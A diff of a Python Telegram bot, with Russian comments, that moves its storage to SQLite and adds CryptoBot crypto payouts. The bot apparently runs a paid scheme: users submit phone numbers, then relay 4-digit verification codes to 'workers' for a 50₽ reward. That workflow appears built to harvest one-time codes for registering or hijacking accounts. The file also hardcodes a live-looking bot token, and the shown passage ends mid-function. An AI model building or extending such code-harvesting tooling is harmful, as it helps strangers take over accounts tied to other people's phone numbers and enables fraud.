@@ -1,369 +1,569 @@
-import os, requests, json, threading, time
+import os, requests, json, threading, time, sqlite3, hashlib, hmac
 from flask import Flask, request
 from datetime import datetime
+from functools import wraps
 
 app = Flask(__name__)
 
 # ===== НАСТРОЙКИ =====
-TOKEN = "8897748741:AAG2f8sHicGX_wxGEBPm2gqgbULhkGp4weE"
+TOKEN = "8897748741:AAG2f8sHicGX_wxGEBPm2gqgbULhkGp4weE"  # ЗАМЕНИ НА НОВЫЙ!
 ADMIN = 5979001063
 WORKERS = [5979001063]  # ID воркеров через запятую
-# =====================
+
+# CryptoBot настройки (получить у @CryptoBot)
+CRYPTO_TOKEN = "ВАШ_API_ТОКЕН_ОТ_CRYPTOBOT"
+CRYPTO_API = "https://pay.crypt.bot/api"
+# ===========================
 
 URL = f"https://api.telegram.org/bot{TOKEN}/"
 
-# === ДАННЫЕ ===
-заявки = {}
-воркеры = {}
-пользователи = {}  # {user_id: {"balance": 0, "history": []}}
-заявки_на_вывод = {}
-счетчик_заявок = 1
-счетчик_выводов = 1
-активные = {}
+# === БАЗА ДАННЫХ ===
+def init_db():
+    conn = sqlite3.connect('bot.db')
+    c = conn.cursor()
+    
+    # Пользователи
+    c.execute('''CREATE TABLE IF NOT EXISTS users (
+        user_id INTEGER PRIMARY KEY,
+        username TEXT,
+        first_name TEXT,
+        balance REAL DEFAULT 0,
+        registered_at TIMESTAMP,
+        total_earned REAL DEFAULT 0,
+        total_withdrawn REAL DEFAULT 0
+    )''')
+    
+    # Телефоны (уникальные)
+    c.execute('''CREATE TABLE IF NOT EXISTS phones (
+        phone TEXT PRIMARY KEY,
+        user_id INTEGER,
+        verified_at TIMESTAMP,
+        FOREIGN KEY (user_id) REFERENCES users(user_id)
+    )''')
+    
+    # Заявки на верификацию
+    c.execute('''CREATE TABLE IF NOT EXISTS verify_requests (
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        user_id INTEGER,
+        phone TEXT,
+        worker_id INTEGER,
+        code TEXT,
+        status TEXT,
+        created_at TIMESTAMP,
+                completed_at TIMESTAMP,
+        reward REAL DEFAULT 50,
+        FOREIGN KEY (user_id) REFERENCES users(user_id)
+    )''')
+    
+    # Заявки на вывод
+    c.execute('''CREATE TABLE IF NOT EXISTS withdraw_requests (
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        user_id INTEGER,
+        amount REAL,
+        status TEXT,
+        crypto_asset TEXT DEFAULT 'USDT',
+        crypto_address TEXT,
+        check_url TEXT,
+        created_at TIMESTAMP,
+        processed_at TIMESTAMP,
+        FOREIGN KEY (user_id) REFERENCES users(user_id)
+    )''')
+    
+    # История транзакций
+    c.execute('''CREATE TABLE IF NOT EXISTS transactions (
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        user_id INTEGER,
+        amount REAL,
+        type TEXT,
+        description TEXT,
+        created_at TIMESTAMP
+    )''')
+    
+    # Воркеры
+    c.execute('''CREATE TABLE IF NOT EXISTS workers (
+        user_id INTEGER PRIMARY KEY,
+        username TEXT,
+        first_name TEXT,
+        status TEXT DEFAULT 'free',
+        current_request_id INTEGER,
+        total_completed INTEGER DEFAULT 0,
+        total_earned REAL DEFAULT 0,
+        registered_at TIMESTAMP
+    )''')
+    
+    conn.commit()
+    conn.close()
 
-def отправить(куда, текст, клава=None, заменить=False):
-    if заменить and куда in активные:
-        msg_id = активные[куда]
-        данные = {"chat_id": куда, "message_id": msg_id, "text": текст}
+init_db()
+
+def db_query(query, params=(), fetchone=False, fetchall=False):
+    conn = sqlite3.connect('bot.db')
+    c = conn.cursor()
+    c.execute(query, params)
+    result = None
+    if fetchone:
+        result = c.fetchone()
+    elif fetchall:
+        result = c.fetchall()
+    conn.commit()
+    conn.close()
+    return result
+
+# === ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ===
+def обновить_баланс(user_id, amount, description, txn_type):
+    """Обновляет баланс и добавляет транзакцию"""
+    db_query("UPDATE users SET balance = balance + ? WHERE user_id = ?", (amount, user_id))
+    db_query("INSERT INTO transactions (user_id, amount, type, description, created_at) VALUES (?, ?, ?, ?, ?)",
+             (user_id, amount, txn_type, description, datetime.now().isoformat()))
+    
+    if amount > 0:
+        db_query("UPDATE users SET total_earned = total_earned + ? WHERE user_id = ?", (amount, user_id))
+    else:
+        db_query("UPDATE users SET total_withdrawn = total_withdrawn + ? WHERE user_id = ?", (abs(amount), user_id))
+
+def телефон_уже_верифицирован(phone):
+    result = db_query("SELECT phone FROM phones WHERE phone = ?", (phone,), fetchone=True)
+    return result is not None
+
+def отправить(chat_id, text, клава=None, заменить=False):
+    if заменить and chat_id in активные:
+        msg_id = активные[chat_id]
+        данные = {"chat_id": chat_id, "message_id": msg_id, "text": text}
         if клава: данные["reply_markup"] = json.dumps(клава)
         ответ = requests.post(URL + "editMessageText", data=данные)
         if ответ.status_code == 200:
             return
-    данные = {"chat_id": куда, "text": текст}
+    данные = {"chat_id": chat_id, "text": text, "parse_mode": "HTML"}
     if клава: данные["reply_markup"] = json.dumps(клава)
     ответ = requests.post(URL + "sendMessage", data=данные)
     if ответ.status_code == 200:
         рез = ответ.json()
         if "result" in рез:
-            активные[куда] = рез["result"]["message_id"]
+            активные[chat_id] = рез["result"]["message_id"]
 
-def кнопки_заявки(ид, статус):
+# === КРАСИВЫЕ КНОПКИ (цветные) ===
+def кнопки_заявки(req_id, status):
     табл = {
-        "новая": [[{"text":"🔑 Взять заявку","callback_data":f"взять_{ид}"}]],
-        "код_запрошен": [[{"text":"📝 Ввести код","callback_data":f"код_{ид}"}]],
-        "код_получен": [[{"text":"✅ Принять","callback_data":f"принять_{ид}"},{"text":"❌ Отклонить","callback_data":f"отказ_{ид}"}]],
-        "холд": [[{"text":"💸 Выплатить","callback_data":f"платить_{ид}"}]]
+        "new": [
+            [{"text":"🔑 ВЗЯТЬ ЗАЯВКУ","callback_data":f"take_{req_id}","color":"primary"}]
+        ],
+        "code_requested": [
+            [{"text":"📝 ВВЕСТИ КОД","callback_data":f"code_{req_id}","color":"primary"}]
+        ],
+        "code_received": [
+            [{"text":"✅ ПРИНЯТЬ","callback_data":f"approve_{req_id}","color":"success"},{"text":"❌ ОТКЛОНИТЬ","callback_data":f"reject_{req_id}","color":"danger"}]
+        ],
+        "hold": [
+            [{"text":"💸 ВЫПЛАТИТЬ","callback_data":f"pay_{req_id}","color":"success"}]
+        ]
     }
-    return {"inline_keyboard": табл.get(статус, [])}
+    # Конвертируем цветные кнопки в формат Telegram
+    kb = []
+    for row in табл.get(status, []):
+        new_row = []
+        for btn in row:
+            text = btn["text"]
+            cb = btn["callback_data"]
+            new_row.append({"text": text, "callback_data": cb})
+        kb.append(new_row)
+    return {"inline_keyboard": kb}
 
 def меню_воркера():
-    return {"keyboard": [[{"text":"📋 Мой статус"}], [{"text":"🏠 Главное меню"}]], "resize_keyboard": True}
+    return {"keyboard": [
+        [{"text":"📊 МОЙ СТАТУС"}],
+        [{"text":"🏠 ГЛАВНОЕ МЕНЮ"}]
+    ], "resize_keyboard": True, "one_time_keyboard": False}
 
 def меню_пользователя():
     return {"keyboard": [
-        [{"text":"📝 Новая заявка"}],
-        [{"text":"💰 Мой баланс"}, {"text":"💸 Вывести"}],
-        [{"text":"📋 История заявок"}, {"text":"📜 История выводов"}]
-    ], "resize_keyboard": True}
+        [{"text":"📝 НОВАЯ ЗАЯВКА"}],
+        [{"text":"💰 БАЛАНС"}, {"text":"💸 ВЫВЕСТИ"}],
+        [{"text":"📋 ИСТОРИЯ"}, {"text":"📜 ВЫВОДЫ"}]
+    ], "resize_keyboard": True, "one_time_keyboard": False}
 
 def меню_админа():
     return {"keyboard": [
-        [{"text":"📋 Все заявки"}, {"text":"👥 Воркеры"}],
-        [{"text":"💸 Заявки на вывод"}, {"text":"📊 Статистика"}],
-        [{"text":"🏠 Главное меню"}]
-    ], "resize_keyboard": True}
+        [{"text":"📋 ВСЕ ЗАЯВКИ"}, {"text":"👥 ВОРКЕРЫ"}],
+        [{"text":"💸 ЗАЯВКИ НА ВЫВОД"}, {"text":"📊 СТАТИСТИКА"}],
+        [{"text":"🏠 ГЛАВНОЕ МЕНЮ"}]
+    ], "resize_keyboard": True, "one_time_keyboard": False}
 
-def главное_меню(юзер):
-    if юзер == ADMIN:
+def главное_меню(user_id):
+    if user_id == ADMIN:
         return меню_админа()
-    elif юзер in WORKERS:
+    elif user_id in WORKERS:
         return меню_воркера()
     else:
         return меню_пользователя()
 
-def обновить_баланс(юзер, сумма, причина):
-    if юзер not in пользователи:
-        пользователи[юзер] = {"balance": 0, "history": [], "username": "", "name": ""}
-    пользователи[юзер]["balance"] += сумма
-    пользователи[юзер]["history"].append({
-        "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
-        "amount": сумма,
-        "reason": причина,
-        "new_balance": пользователи[юзер]["balance"]
-    })
+# === CRYPTOBOT ===
+def крипто_запрос(method, data=None):
+    headers = {"Crypto-Pay-API-Token": CRYPTO_TOKEN, "Content-Type": "application/json"}
+    try:
+        response = requests.post(f"{CRYPTO_API}/{method}", headers=headers, json=data or {})
+        return response.json()
+    except:
+        return None
+
+def крипто_создать_чек(amount, user_id, asset="USDT"):
+    result = крипто_запрос("createCheck", {"asset": asset, "amount": str(amount), "description": f"Вывод для пользователя {user_id}"})
+    if result and result.get("ok"):
+        return result["result"]["check_url"]
+    return None
+
+# === ОСНОВНАЯ ЛОГИКА ===
+счетчик_заявок = 1
+активные = {}
+текущие_состояния = {}  # user_id -> {"state": "waiting_phone" or "waiting_withdraw_amount", "temp_data": {}}
 
 @app.route(f"/{TOKEN}", methods=["POST"])
-def вебхук():
-    данные = request.get_json()
+def webhook():
+    data = request.get_json()
     
-    if "message" in данные:
-        msg = данные["message"]
-        юзер = msg["from"]["id"]
-        чат = msg["chat"]["id"]
-        текст = msg.get("text")
-        имя = msg["from"].get("first_name", "")
-        юзернейм = msg["from"].get("username", "")
+    if "message" in data:
+        msg = data["message"]
+        user_id = msg["from"]["id"]
+        chat_id = msg["chat"]["id"]
+        text = msg.get("text")
+        first_name = msg["from"].get("first_name", "")
+        username = msg["from"].get("username", "")
         
-        # Инициализация
-        if юзер not in пользователи:
-            пользователи[юзер] = {"balance": 0, "history": [], "username": юзернейм, "name": имя}
+        # Регистрация пользователя
+        user = db_query("SELECT user_id FROM users WHERE user_id = ?", (user_id,), fetchone=True)
+        if not user:
+            db_query("INSERT INTO users (user_id, username, first_name, registered_at) VALUES (?, ?, ?, ?)",
+                     (user_id, username, first_name, datetime.now().isoformat()))
         
         # Регистрация воркера
-        if юзер in WORKERS and юзер not in воркеры:
-            воркеры[юзер] = {"status": "free", "current": None, "name": имя, "username": юзернейм}
-            отправить(юзер, "✅ Ты зарегистрирован как воркер!", меню_воркера())
+        if user_id in WORKERS:
+            worker = db_query("SELECT user_id FROM workers WHERE user_id = ?", (user_id,), fetchone=True)
+            if not worker:
+                db_query("INSERT INTO workers (user_id, username, first_name, registered_at, status) VALUES (?, ?, ?, ?, ?)",
+                         (user_id, username, first_name, datetime.now().isoformat(), "free"))
         
         # Команда /start
-        if текст == "/start":
-            отправить(чат, f"👋 Добро пожаловать!\n💰 Твой баланс: {пользователи[юзер]['balance']}₽", главное_меню(юзер))
+        if text == "/start":
+            balance = db_query("SELECT balance FROM users WHERE user_id = ?", (user_id,), fetchone=True)[0]
+            отправить(chat_id, f"✨ <b>ДОБРО ПОЖАЛОВАТЬ!</b> ✨\n\n💰 <b>Ваш баланс:</b> {balance}₽\n\n📌 Выберите действие в меню ниже:", главное_меню(user_id))
             return "ok", 200
         
         # Возврат в главное меню
-        if текст == "🏠 Главное меню":
-            отправить(чат, "🏠 Главное меню:", главное_меню(юзер))
+        if text == "🏠 ГЛАВНОЕ МЕНЮ":
+            balance = db_query("SELECT balance FROM users WHERE user_id = ?", (user_id,), fetchone=True)[0]
+            отправить(chat_id, f"✨ <b>ГЛАВНОЕ МЕНЮ</b> ✨\n\n💰 <b>Баланс:</b> {balance}₽", главное_меню(user_id))
             return "ok", 200
         
-        # Состояния
-        состояние = заявки.get(юзер, {}).get("state", "")
+        # Обработка состояний
+        состояние = текущие_состояния.get(user_id, {}).get("state", "")
         
         # Ждем код от пользователя
         if состояние == "waiting_code":
-            if текст and текст.isdigit() and len(текст) == 4:
-                тикет = заявки[юзер]["current"]
-                if тикет in заявки and заявки[тикет]["status"] == "код_запрошен":
-                    заявки[тикет]["код"] = текст
-                    заявки[тикет]["status"] = "код_получен"
-                    заявки[юзер]["state"] = ""
-                    отправить(чат, "✅ Код отправлен воркеру!", заменить=True)
-                    воркер_ид = заявки[тикет].get("worker")
-                    if воркер_ид:
-                        отправить(воркер_ид, f"📝 Код для #{тикет}: {текст}", кнопки_заявки(тикет, "код_получен"))
+            if text and text.isdigit() and len(text) == 4:
+                req_id = текущие_состояния[user_id]["request_id"]
+                req = db_query("SELECT * FROM verify_requests WHERE id = ? AND status = 'code_requested'", (req_id,), fetchone=True)
+                if req:
+                    db_query("UPDATE verify_requests SET code = ?, status = 'code_received' WHERE id = ?", (text, req_id))
+                    отправить(chat_id, "✅ <b>КОД ОТПРАВЛЕН ВОРКЕРУ!</b>\n\nОжидайте подтверждения.", заменить=True)
+                    worker_id = req[3]
+                    отправить(worker_id, f"📝 <b>ПОЛУЧЕН КОД ДЛЯ ЗАЯВКИ #{req_id}</b>\n\n🔑 Код: <code>{text}</code>", кнопки_заявки(req_id, "code_received"))
+                    текущие_состояния[user_id]["state"] = ""
             else:
-                отправить(чат, "❌ Введи 4 цифры")
+                отправить(chat_id, "❌ <b>НЕВЕРНЫЙ ФОРМАТ</b>\n\nВведите 4 цифры кода:", заменить=True)
             return "ok", 200
         
         # Ждем сумму для вывода
         if состояние == "waiting_withdraw_amount":
             try:
-                сумма = float(текст.replace(",", "."))
-                if сумма <= 0:
-                    отправить(чат, "❌ Сумма должна быть больше 0")
-                    return "ok", 200
-                if сумма > пользователи[юзер]["balance"]:
-                    отправить(чат, f"❌ Недостаточно средств. Твой баланс: {пользователи[юзер]['balance']}₽")
+                amount = float(text.replace(",", "."))
+                if amount <= 0:
+                    отправить(chat_id, "❌ <b>СУММА ДОЛЖНА БЫТЬ БОЛЬШЕ 0</b>", заменить=True)
                     return "ok", 200
                 
-                # Автовывод — сразу списываем с баланса и создаем заявку на выплату админу
-                обновить_баланс(юзер, -сумма, f"Вывод {сумма}₽")
+                balance = db_query("SELECT balance FROM users WHERE user_id = ?", (user_id,), fetchone=True)[0]
+                if amount > balance:
+                    отправить(chat_id, f"❌ <b>НЕДОСТАТОЧНО СРЕДСТВ</b>\n\n💰 Ваш баланс: {balance}₽", заменить=True)
+                    return "ok", 200
                 
-                # Уведомляем админа о необходимости выплаты
-                отправить(ADMIN, f"💸 ЗАПРОС НА ВЫВОД\n👤 @{юзернейм or имя}\n💰 Сумма: {сумма}₽\n📅 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\nВыплати пользователю и нажми кнопку ниже.",
-                    {"inline_keyboard": [[{"text":"✅ Подтвердить вывод", "callback_data":f"выв_подтвердить_{юзер}_{сумма}"}]]})
+                # Создаем чек в CryptoBot
+                check_url = крипто_создать_чек(amount, user_id)
+                if check_url:
+                    # Создаем заявку на вывод
+                    db_query("INSERT INTO withdraw_requests (user_id, amount, status, check_url, created_at) VALUES (?, ?, 'pending', ?, ?)",
+                             (user_id, amount, check_url, datetime.now().isoformat()))
+                    
+                    # Уведомляем админа
+                    отправить(ADMIN, f"💸 <b>ЗАЯВКА НА ВЫВОД</b>\n\n👤 <b>Пользователь:</b> @{username or first_name}\n💰 <b>Сумма:</b> {amount}₽\n🔗 <b>Чек:</b> {check_url}\n\n✅ Нажмите кнопку ниже, когда переведёте пользователю.",
+                             {"inline_keyboard": [[{"text":"✅ ПОДТВЕРДИТЬ ВЫВОД", "callback_data":f"confirm_withdraw_{user_id}_{amount}"}]]})
+                    
+                    отправить(chat_id, f"✅ <b>ЗАЯВКА НА ВЫВОД СОЗДАНА!</b>\n\n💰 Сумма: {amount}₽\n🕐 Ожидайте подтверждения администратора.\n\nСредства временно заблокированы.", заменить=True)
+                    
+                    # Временно блокируем сумму
+                    обновить_баланс(user_id, -amount, f"Вывод {amount}₽ (заблокировано)", "withdraw_pending")
+                else:
+                    отправить(chat_id, "❌ <b>ОШИБКА СОЗДАНИЯ ЧЕКА</b>\n\nПопробуйте позже.", заменить=True)
                 
-                заявки[юзер]["state"] = ""
-                отправить(чат, f"✅ Заявка на вывод {сумма}₽ отправлена! Ожидай выплаты от администратора.", заменить=True)
-                
+                текущие_состояния[user_id]["state"] = ""
             except:
-                отправить(чат, "❌ Введи число, например: 500")
+                отправить(chat_id, "❌ <b>ОШИБКА</b>\n\nВведите число, например: 500", заменить=True)
             return "ok", 200
         
         # Ждем номер телефона
         if состояние == "waiting_phone":
-            телефон = текст.strip()
-            if телефон.startswith("+") and len(телефон) >= 10:
+            phone = text.strip()
+            if phone.startswith("+") and len(phone) >= 10:
+                if телефон_уже_верифицирован(phone):
+                    отправить(chat_id, "❌ <b>ЭТОТ НОМЕР УЖЕ ПРОХОДИЛ ВЕРИФИКАЦИЮ!</b>\n\nКаждый номер можно подтвердить только 1 раз.", заменить=True)
+                    текущие_состояния[user_id]["state"] = ""
+                    return "ok", 200
+                
                 global счетчик_заявок
-                тикет = счетчик_заявок
+                req_id = счетчик_заявок
                 счетчик_заявок += 1
-                заявки[тикет] = {"user": юзер, "phone": телефон, "status": "новая", "worker": None}
-                заявки[юзер]["state"] = ""
-                отправить(чат, f"✅ Заявка #{тикет} создана! Ожидай воркера.", заменить=True)
-                # Рассылка воркерам
-                for wid, w in воркеры.items():
-                    if w.get("status") == "free":
-                        отправить(wid, f"🆕 НОВАЯ ЗАЯВКА #{тикет}\n📞 {телефон}\n💰 Награда: 50₽", кнопки_заявки(тикет, "новая"))
+                
+                db_query("INSERT INTO verify_requests (id, user_id, phone, status, created_at, reward) VALUES (?, ?, ?, 'new', ?, ?)",
+                         (req_id, user_id, phone, datetime.now().isoformat(), 50))
+                
+                отправить(chat_id, f"✅ <b>ЗАЯВКА #{req_id} СОЗДАНА!</b>\n\n📞 Номер: {phone}\n🕐 Ожидайте, скоро с вами свяжутся.", заменить=True)
+                
+                # Рассылаем свободным воркерам
+                free_workers = db_query("SELECT user_id FROM workers WHERE status = 'free'", fetchall=True)
+                for w in free_workers:
+                    отправить(w[0], f"🆕 <b>НОВАЯ ЗАЯВКА #{req_id}</b>\n\n📞 Телефон: {phone}\n💰 Награда: 50₽\n\nНажмите кнопку ниже, чтобы взять заявку.", кнопки_заявки(req_id, "new"))
+                
+                текущие_состояния[user_id]["state"] = ""
             else:
-                отправить(чат, "❌ Формат: +79001234567")
+                отправить(chat_id, "❌ <b>НЕВЕРНЫЙ ФОРМАТ</b>\n\nВведите номер в формате: +79001234567", заменить=True)
             return "ok", 200
         
         # Команды воркера
-        if юзер in WORKERS:
-            if текст == "📋 Мой статус":
-                тек = воркеры[юзер].get("current")
-                if тек:
-                    отправить(чат, f"📋 Ты выполняешь заявку #{тек}\nСтатус: {заявки[тек]['status']}")
+        if user_id in WORKERS:
+            if text == "📊 МОЙ СТАТУС":
+                worker = db_query("SELECT status, current_request_id, total_completed, total_earned FROM workers WHERE user_id = ?", (user_id,), fetchone=True)
+                if worker[1]:
+                    req = db_query("SELECT phone FROM verify_requests WHERE id = ?", (worker[1],), fetchone=True)
+                    отправить(chat_id, f"📊 <b>СТАТУС ВОРКЕРА</b>\n\n📌 <b>Статус:</b> {'Занят' if worker[0] == 'busy' else 'Свободен'}\n📋 <b>Текущая заявка:</b> #{worker[1]} ({req[0] if req else '-'})\n✅ <b>Выполнено заявок:</b> {worker[2]}\n💰 <b>Заработано:</b> {worker[3]}₽")
                 else:
-                    отправить(чат, "✅ Ты свободен. Жди новых заявок!")
+                    отправить(chat_id, f"📊 <b>СТАТУС ВОРКЕРА</b>\n\n📌 <b>Статус:</b> Свободен\n✅ <b>Выполнено заявок:</b> {worker[2]}\n💰 <b>Заработано:</b> {worker[3]}₽")
                 return "ok", 200
         
         # Команды админа
-        if юзер == ADMIN:
-            if текст == "📋 Все заявки":
-                спс = "\n".join([f"#{t}: {d['phone']} | {d['status']} | воркер: {d.get('worker', 'нет')}" for t,d in заявки.items()]) or "Нет заявок"
-                отправить(чат, f"📋 Все заявки на верификацию:\n{спс}", меню_админа())
-            elif текст == "👥 Воркеры":
-                спс = "\n".join([f"@{w.get('username', w.get('name'))} | {w.get('status')} | заявка: {w.get('current', 'нет')}" for w in воркеры.values()]) or "Нет воркеров"
-                отправить(чат, f"👥 Воркеры:\n{спс}", меню_админа())
-            elif текст == "💸 Заявки на вывод":
-                отправить(чат, "💰 Заявки на вывод обрабатываются через кнопки в уведомлениях", меню_админа())
-            elif текст == "📊 Статистика":
-                всего_пользователей = len(пользователи)
-                всего_заявок = len(заявки)
-                выплачено = sum([u["balance"] for u in пользователи.values() if u["balance"] < 0])
-                отправить(чат, f"📊 СТАТИСТИКА\n👥 Пользователей: {всего_пользователей}\n📋 Заявок: {всего_заявок}\n💰 Выплачено: {abs(выплачено)}₽", меню_админа())
+        if user_id == ADMIN:
+            if text == "📋 ВСЕ ЗАЯВКИ":
+                requests_db = db_query("SELECT id, user_id, phone, status, created_at FROM verify_requests ORDER BY id DESC LIMIT 20", fetchall=True)
+                if not requests_db:
+                    отправить(chat_id, "📭 <b>НЕТ ЗАЯВОК</b>", меню_админа())
+                else:
+                    msg = "<b>📋 ПОСЛЕДНИЕ ЗАЯВКИ</b>\n\n"
+                    for r in requests_db:
+                        status_emoji = {"new": "🆕", "code_requested": "⏳", "code_received": "📝", "hold": "🕐", "completed": "✅", "rejected": "❌"}
+                        msg += f"{status_emoji.get(r[3], '❓')} <b>#{r[0]}</b> | {r[2]} | {r[3]}\n"
+                    отправить(chat_id, msg, меню_админа())
+            elif text == "👥 ВОРКЕРЫ":
+                workers = db_query("SELECT user_id, username, first_name, status, total_completed FROM workers", fetchall=True)
+                if not workers:
+                    отправить(chat_id, "👥 <b>НЕТ ЗАРЕГИСТРИРОВАННЫХ ВОРКЕРОВ</b>\n\nДобавьте ID вручную в список WORKERS в коде.", меню_админа())
+                else:
+                    msg = "<b>👥 СПИСОК ВОРКЕРОВ</b>\n\n"
+                    for w in workers:
+                        msg += f"🆔 <code>{w[0]}</code> | @{w[1] or w[2]} | {'🟢 Свободен' if w[3] == 'free' else '🔴 Занят'} | ✅ {w[4]}\n"
+                    отправить(chat_id, msg, меню_админа())
+            elif text == "💸 ЗАЯВКИ НА ВЫВОД":
+                pending = db_query("SELECT id, user_id, amount, check_url, created_at FROM withdraw_requests WHERE status = 'pending'", fetchall=True)
+                if not pending:
+                    отправить(chat_id, "💸 <b>НЕТ АКТИВНЫХ ЗАЯВОК НА ВЫВОД</b>", меню_админа())
+                else:
+                    msg = "<b>💸 ЗАЯВКИ НА ВЫВОД</b>\n\n"
+                    for p in pending:
+                        user = db_query("SELECT username, first_name FROM users WHERE user_id = ?", (p[1],), fetchone=True)
+                        msg += f"🎫 <b>#{p[0]}</b> | @{user[0] or user[1]} | {p[2]}₽ | {p[3][:50]}...\n"
+                    отправить(chat_id, msg, меню_админа())
+            elif text == "📊 СТАТИСТИКА":
+                total_users = db_query("SELECT COUNT(*) FROM users", fetchone=True)[0]
+                total_requests = db_query("SELECT COUNT(*) FROM verify_requests", fetchone=True)[0]
+                completed = db_query("SELECT COUNT(*) FROM verify_requests WHERE status = 'completed'", fetchone=True)[0]
+                total_withdrawn = db_query("SELECT SUM(amount) FROM withdraw_requests WHERE status = 'completed'", fetchone=True)[0] or 0
+                msg = f"<b>📊 СТАТИСТИКА БОТА</b>\n\n👥 <b>Пользователей:</b> {total_users}\n📋 <b>Всего заявок:</b> {total_requests}\n✅ <b>Выполнено:</b> {completed}\n💰 <b>Выведено:</b> {total_withdrawn}₽"
+                отправить(chat_id, msg, меню_админа())
             return "ok", 200
         
         # Команды пользователя
-        if текст == "📝 Новая заявка":
-            заявки[юзер] = {"state": "waiting_phone"}
-            отправить(чат, "📞 Введи номер телефона для верификации:\nПример: +79001234567")
-        
-        elif текст == "💰 Мой баланс":
-            отправить(чат, f"💰 ТВОЙ БАЛАНС: {пользователи[юзер]['balance']}₽", заменить=True)
-        
-        elif текст == "💸 Вывести":
-            if пользователи[юзер]["balance"] <= 0:
-                отправить(чат, "❌ У тебя нет средств для вывода")
+        if text == "📝 НОВАЯ ЗАЯВКА":
+            текущие_состояния[user_id] = {"state": "waiting_phone"}
+            отправить(chat_id, "📞 <b>ВВЕДИТЕ НОМЕР ТЕЛЕФОНА</b>\n\nПример: <code>+79001234567</code>\n\n❗️ Каждый номер можно подтвердить только 1 раз.", заменить=True)
+        elif text == "💰 БАЛАНС":
+            balance = db_query("SELECT balance FROM users WHERE user_id = ?", (user_id,), fetchone=True)[0]
+            total_earned = db_query("SELECT total_earned FROM users WHERE user_id = ?", (user_id,), fetchone=True)[0]
+            отправить(chat_id, f"💰 <b>ВАШ БАЛАНС</b>\n\n💎 <b>Доступно:</b> {balance}₽\n📈 <b>Всего заработано:</b> {total_earned}₽", заменить=True)
+        elif text == "💸 ВЫВЕСТИ":
+            balance = db_query("SELECT balance FROM users WHERE user_id = ?", (user_id,), fetchone=True)[0]
+            if balance <= 0:
+                отправить(chat_id, "❌ <b>НЕДОСТАТОЧНО СРЕДСТВ ДЛЯ ВЫВОДА</b>", заменить=True)
             else:
-                заявки[юзер] = {"state": "waiting_withdraw_amount"}
-                отправить(чат, f"💰 Твой баланс: {пользователи[юзер]['balance']}₽\n💸 Введи сумму для вывода (целое или дробное):")
-        
-        elif текст == "📋 История заявок":
-            мои = [t for t in заявки.values() if t.get("user") == юзер]
-            if not мои:
-                отправить(чат, "📭 У тебя пока нет заявок на верификацию")
+                текущие_состояния[user_id] = {"state": "waiting_withdraw_amount"}
+                отправить(chat_id, f"💰 <b>ВАШ БАЛАНС: {balance}₽</b>\n\n💸 <b>ВВЕДИТЕ СУММУ ДЛЯ ВЫВОДА</b>\n\nМинимальная сумма: 100₽\nКомиссия: 0%", заменить=True)
+        elif text == "📋 ИСТОРИЯ":
+            history = db_query("SELECT phone, status, completed_at, reward FROM verify_requests WHERE user_id = ? ORDER BY id DESC LIMIT 10", (user_id,), fetchall=True)
+            if not history:
+                отправить(chat_id, "📭 <b>У ВАС НЕТ ЗАЯВОК</b>\n\nНажмите «НОВАЯ ЗАЯВКА», чтобы начать.", заменить=True)
             else:
-                спс = "\n".join([f"#{i+1} {t['phone']} — {t.get('status','')}" for i,t in enumerate(мои[-10:])])
-                отправить(чат, f"📋 ПОСЛЕДНИЕ ЗАЯВКИ:\n{спс}\n\nВсего: {len(мои)}", меню_пользователя())
-        
-        elif текст == "📜 История выводов":
-            мои_выводы = [v for k,v in заявки_на_вывод.items() if v["user"] == юзер]
-            if not мои_выводы:
-                отправить(чат, "📭 У тебя пока нет заявок на вывод")
+                msg = "<b>📋 ИСТОРИЯ ЗАЯВОК</b>\n\n"
+                for h in history:
+                    status_emoji = {"completed": "✅", "rejected": "❌", "expired": "⏰"}
+                    msg += f"{status_emoji.get(h[1], '❓')} <b>{h[0]}</b> | {h[3]}₽ | {h[2][:16] if h[2] else '-'}\n"
+                отправить(chat_id, msg, заменить=True)
+        elif text == "📜 ВЫВОДЫ":
+            withdrawals = db_query("SELECT amount, status, created_at FROM withdraw_requests WHERE user_id = ? ORDER BY id DESC LIMIT 10", (user_id,), fetchall=True)
+            if not withdrawals:
+                отправить(chat_id, "📭 <b>У ВАС НЕТ ЗАЯВОК НА ВЫВОД</b>", заменить=True)
             else:
-                спс = "\n".join([f"#{k+1}: {v['amount']}₽ | {v['status']} | {v['created'][:16]}" for k,v in enumerate(мои_выводы[-10:])])
-                отправить(чат, f"📜 ИСТОРИЯ ВЫВОДОВ:\n{спс}", меню_пользователя())
+                msg = "<b>📜 ИСТОРИЯ ВЫВОДОВ</b>\n\n"
+                for w in withdrawals:
+                    status_emoji = {"pending": "⏳", "completed": "✅", "rejected": "❌"}
+                    msg += f"{status_emoji.get(w[1], '❓')} <b>{w[0]}₽</b> | {w[2][:16]}\n"
+                отправить(chat_id, msg, заменить=True)
     
     # Обработка нажатий на кнопки
-    elif "callback_query" in данные:
-        кн = данные["callback_query"]
-        юзер = кн["from"]["id"]
-        данные_кн = кн["data"]
-        callback_id = кн["id"]
+    elif "callback_query" in data:
+        cb = data["callback_query"]
+        user_id = cb["from"]["id"]
+        cb_data = cb["data"]
+        callback_id = cb["id"]
         requests.post(URL + "answerCallbackQuery", data={"callback_query_id": callback_id})
         
         # Подтверждение вывода админом
-        if данные_кн.startswith("выв_подтвердить_"):
-            if юзер != ADMIN:
+        if cb_data.startswith("confirm_withdraw_"):
+            if user_id != ADMIN:
                 return "ok", 200
-            parts = данные_кн.split("_")
-            пользователь_ид = int(parts[2])
-            сумма = float(parts[3])
+            parts = cb_data.split("_")
+            target_user = int(parts[2])
+            amount = float(parts[3])
             
-            # Логируем вывод
-            выв_ид = счетчик_выводов
-            счетчик_выводов += 1
-            заявки_на_вывод[выв_ид] = {
-                "user": пользователь_ид,
-                "amount": сумма,
-                "status": "completed",
-                "created": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-            }
+            # Обновляем статус заявки
+            db_query("UPDATE withdraw_requests SET status = 'completed', processed_at = ? WHERE user_id = ? AND amount = ? AND status = 'pending'",
+                     (datetime.now().isoformat(), target_user, amount))
             
-            отправить(пользователь_ид, f"✅ ВЫВОД {сумма}₽ ПОДТВЕРЖДЁН!\n💰 Деньги отправлены на указанные реквизиты.")
-            отправить(ADMIN, f"✅ Вывод {сумма}₽ пользователю подтверждён")
